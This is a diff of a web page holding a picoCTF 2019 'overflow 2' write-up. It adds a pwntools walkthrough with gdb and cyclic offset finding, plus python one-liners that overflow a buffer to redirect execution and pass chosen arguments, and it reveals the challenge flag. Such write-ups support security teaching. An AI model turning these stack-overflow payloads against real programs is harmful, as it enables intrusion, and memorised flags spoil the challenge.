@@ -229,4 +229,32 @@ Backtrace stopped: previous frame inner to this frame (corrupt stack?)
 Please enter your string: 
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
 picoCTF{arg5_and_r3turn51b106031}Segmentation fault (core dumped)
-</code></pre><p><code>r &lt; &lt;(python -c 'from pwn import *; print "A"*176+"B"*12+p32(0x080485E6)+"A"*4+p32(0xDEADBEEF)+p32(0xC0DED00D)')</code><p>Also works.<h2><a class=header href=#flag id=flag>Flag</a></h2><p><code>picoCTF{arg5_and_r3turn51b106031}</code></main><nav class=nav-wrapper aria-label="Page navigation"><a rel=prev href=../../ctf/binary/picoctf19-overflow_1.html class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts=Left><i class="fa fa-angle-left"></i></a><a rel=next href=../../ctf/binary/picoctf19-new_overflow_1.html class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts=Right><i class="fa fa-angle-right"></i></a><div style=clear:both></div></nav></div></div><nav class=nav-wide-wrapper aria-label="Page navigation"><a rel=prev href=../../ctf/binary/picoctf19-overflow_1.html class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts=Left><i class="fa fa-angle-left"></i></a><a rel=next href=../../ctf/binary/picoctf19-new_overflow_1.html class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts=Right><i class="fa fa-angle-right"></i></a></nav></div><script>window.playpen_copyable=true;</script><script src=../../elasticlunr.min.js></script><script src=../../mark.min.js></script><script src=../../searcher.js></script><script src=../../clipboard.min.js></script><script src=../../highlight.js></script><script src=../../book.js></script><script src=../../theme/mermaid.js></script>
+</code></pre><p><code>r &lt; &lt;(python -c 'from pwn import *; print "A"*176+"B"*12+p32(0x080485E6)+"A"*4+p32(0xDEADBEEF)+p32(0xC0DED00D)')</code><p>Also works.<h2><a class=header href=#flag id=flag>Flag</a></h2><p><code>picoCTF{arg5_and_r3turn51b106031}</code><h2><a class=header href=#alternative-solution---pwntools id=alternative-solution---pwntools>Alternative Solution - PwnTools</a></h2><p>To recap, <code>vuln</code> allocates a buffer of size <code>176</code> on the stack and then uses <code>gets</code> a vulnerable function to read from it.<p>The first step is to calculate the amount of padding required from the beginning of the buffer all the way to the return address on the stack.<p>A more detailed explanation can be found on Overflow 1 for the Pwntools cyclic module.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-2$ gdb ./vuln
+... &lt;redacted&gt;
+Reading symbols from ./vuln...(no debugging symbols found)...done.
+Starting program: /problems/overflow-2/vuln &lt; &lt;(cyclic 200)
+Please enter your string: 
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
+
+Program received signal SIGSEGV, Segmentation fault.
+0x62616177 in ?? ()
+</code></pre><p>Let's find the offset for those hex values.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-2$ cyclic -l 0x62616177
+188
+</code></pre><p>So remember the stack grows from the EBP, so our first and second arguments are between <code>#1-#4</code>. However, the code seems to be looking at <code>ebp+8</code> so let's send <code>4 A's</code> before our arguments.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-2$ python -c 'print &quot;A&quot;*188+&quot;\xe6\x85\x04\x08&quot;+&quot;A&quot;*4+&quot;\xef\xbe\xad\xde&quot;+&quot;\x0d\xd0\xde\xc0&quot;' | ./vuln
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
+picoCTF{arg5_and_r3turn51b106031}Segmentation fault (core dumped)
+</code></pre><pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-2$ python -c &quot;from pwn import *; print('A'*188 + p32(0x080485e6) + 'A'*4 + p32(0xDEADBEEF) + p32(0xC0DED00D))&quot; | ./vuln
+Please enter your string: 
+���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
+picoCTF{arg5_and_r3turn51b106031}Segmentation fault (core dumped)
+</code></pre><h2><a class=header href=#alternative-without-gdb id=alternative-without-gdb>Alternative without GDB</a></h2><pre><code class=language-bash>$ cyclic 200 | ./vuln
+Please enter your string: 
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
+
+$ dmesg | grep vuln
+[123123] vuln[3738]: segfault at 62616177 ip 0000000062616177 sp 00000000ffde7fe0 error 14 in libc-2.27.so[f7d1b000+19000]
+
+$ cyclic -l 0x62616177
+188
+</code></pre></main><nav class=nav-wrapper aria-label="Page navigation"><a rel=prev href=../../ctf/binary/picoctf19-overflow_1.html class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts=Left><i class="fa fa-angle-left"></i></a><a rel=next href=../../ctf/binary/picoctf19-new_overflow_1.html class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts=Right><i class="fa fa-angle-right"></i></a><div style=clear:both></div></nav></div></div><nav class=nav-wide-wrapper aria-label="Page navigation"><a rel=prev href=../../ctf/binary/picoctf19-overflow_1.html class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts=Left><i class="fa fa-angle-left"></i></a><a rel=next href=../../ctf/binary/picoctf19-new_overflow_1.html class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts=Right><i class="fa fa-angle-right"></i></a></nav></div><script>window.playpen_copyable=true;</script><script src=../../elasticlunr.min.js></script><script src=../../mark.min.js></script><script src=../../searcher.js></script><script src=../../clipboard.min.js></script><script src=../../highlight.js></script><script src=../../book.js></script><script src=../../theme/mermaid.js></script>
